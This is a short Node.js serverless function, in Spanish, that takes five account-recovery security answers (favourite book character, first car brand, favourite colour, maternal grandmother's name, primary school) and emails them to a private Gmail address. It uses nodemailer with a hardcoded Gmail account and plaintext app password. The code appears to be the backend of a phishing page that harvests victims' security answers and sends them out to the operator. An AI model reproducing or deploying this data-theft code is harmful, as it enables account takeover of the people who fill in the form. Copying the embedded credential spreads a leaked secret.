const nodemailer = require('nodemailer');
require('dotenv').config();

exports.handler = async function(event, context) {
    const { favoriteCharacter, firstCarBrand, favoriteColor, grandmotherName, schoolName } = JSON.parse(event.body);

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'cuentaluperonp5@gmail.com',
            pass: 'hkqlbwibpmntqojg',
        },
    });

    let mailOptions = {
        from: 'cuentaluperonp5@gmail.com',
        to: 'sierroalee@gmail.com',
        subject: 'Respuestas de Seguridad',
        text: `
¿Cuál es el personaje de su libro favorito?: \n\n\n${favoriteCharacter}
¿Cuál es la marca de su primer carro?: \n\n\n${firstCarBrand}
¿Cuál es su color favorito?: \n\n\n${favoriteColor}
¿Cuál es el nombre de su abuela materna?: \n\n\n${grandmotherName}
¿Nombre del colegio donde cursó la primaria?: \n\n\n${schoolName}
        `,
    };

    try {
        await transporter.sendMail(mailOptions);
        return {
            statusCode: 200,
            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
        };
    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ message: 'Error al enviar el correo' }),
        };
    }
};
